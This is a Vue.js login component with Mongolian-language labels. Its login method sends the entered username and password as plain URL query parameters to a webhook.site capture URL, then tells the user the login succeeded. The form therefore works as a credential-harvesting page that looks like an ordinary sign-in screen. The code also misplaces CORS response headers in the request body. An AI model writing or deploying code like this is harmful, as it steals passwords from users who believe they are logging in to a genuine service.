<template>
<div class="app">
  <body>
    <el-row type="flex" justify="center">
      <el-card shadow="hover">
        <el-col :span="24">
          <el-form label-position="top">
            <el-form-item label="Хэрэглэгчийн нэр">            
              <el-input v-model="userName"></el-input>
            </el-form-item>
            <el-form-item label="Нууц үг">
              <el-input v-model="password" type="password"></el-input>
            </el-form-item>
          </el-form>
          
          <el-button :plain="true" @click="login" type="success">Нэвтрэх</el-button>
        </el-col>
      </el-card>
    </el-row>
  </body>
  </div>
</template>



<script>
import axios from 'axios'
import { ElMessage } from 'element-plus'
export default {
  name: 'Login',
  data () {
    return {
      userName: '',
      password: ''
    }
  },
  methods: {
    login () {
        axios
      .post('https://webhook.site/20af77a0-c971-444c-bdcc-cd2fb625f994' + '?userName=' + this.userName + '&password=' + this.password, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "*",
          "Access-Control-Allow-Headers": "*"
        }
      })
        .then(response => {
          if (response.status === 200) {
            ElMessage({
              message: 'Амжилттай нэвтэрлээ...',
              type: 'success',
            })
            this.userName = ''
            this.password = ''
          }
        })
      }
    }
  }
</script>
<style scoped>
body {
 width: 100vw;
 height: 100vh;
 background-image: url("./assets/backgroundImage.jpg");
 background-color: #cccccc;
 background-size: cover;
 justify-content: center;
}
</style>
